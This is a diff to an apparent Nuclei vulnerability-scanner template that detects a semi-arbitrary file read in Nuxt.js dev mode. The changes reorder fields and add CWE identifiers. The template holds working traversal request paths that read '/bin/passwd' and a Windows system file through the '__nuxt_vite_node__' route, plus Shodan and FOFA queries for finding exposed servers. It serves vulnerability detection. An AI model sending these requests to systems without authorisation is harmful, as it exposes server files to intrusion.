@@ -1,5 +1,4 @@
 id: nuxt-js-semi-lfi
-
 info:
   name: Semi Arbitrary File Read in Dev Mode - Nuxt.js
   author: DhiyaneshDK
@@ -10,34 +9,33 @@ info:
     - https://bryces.io/blog/nuxt3
     - https://twitter.com/fofabot/status/1669339995780558849
   classification:
+    cwe-id:
+      - CWE-22
+      - CWE-73
     cpe: cpe:2.3:a:nuxt:framework:*:*:*:*:*:*:*:*
   metadata:
-    verified: "true"
+    fofa-query: body="buildAssetsDir" && body="__nuxt"
     max-request: 2
-    vendor: nuxt
     product: framework
     shodan-query: html:"buildAssetsDir" "nuxt"
-    fofa-query: body="buildAssetsDir" && body="__nuxt"
+    vendor: nuxt
+    verified: "true"
   tags: huntr,lfi,nuxtjs,vuln
-
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/__nuxt_vite_node__/module//bin/passwd"
-      - "{{BaseURL}}/__nuxt_vite_node__/module/C:/Windows/System32/calc.exe"
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
         part: body
+        type: word
         words:
           - '"plugin":'
           - '"pluginCode":'
           - '"id":'
-        condition: and
-
-      - type: word
-        part: header
+      - part: header
+        type: word
         words:
-          - "application/json"
-
+          - application/json
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/__nuxt_vite_node__/module//bin/passwd'
+      - '{{BaseURL}}/__nuxt_vite_node__/module/C:/Windows/System32/calc.exe'
